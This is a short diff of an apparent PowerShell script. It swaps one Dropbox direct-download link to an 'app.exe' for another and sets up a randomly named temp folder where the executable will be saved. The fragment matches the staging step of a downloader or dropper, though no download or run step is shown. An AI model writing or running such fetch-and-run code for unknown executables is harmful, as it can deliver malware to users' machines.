@@ -1,4 +1,4 @@
-$url = "https://www.dropbox.com/scl/fi/fsf1qdtpgo0v12eut8s54/app.exe?rlkey=1gqxkp2vdnlq54jzz8lhggyos&st=w0nafc9b&dl=1"  # Corrected Dropbox URL for direct download
+$url = "https://www.dropbox.com/scl/fi/bmhzfsr1jozvewn6nf58f/app.exe?rlkey=nczxbpok66yan9ikshrupo0pm&st=2niocezv&dl=1"  # Corrected Dropbox URL for direct download
 $tempdir = "$env:TEMP\$(New-Guid)"  # Create a unique temporary directory
 mkdir $tempdir | Out-Null
 $file = "$tempdir\app.exe"  # Define the temporary file path
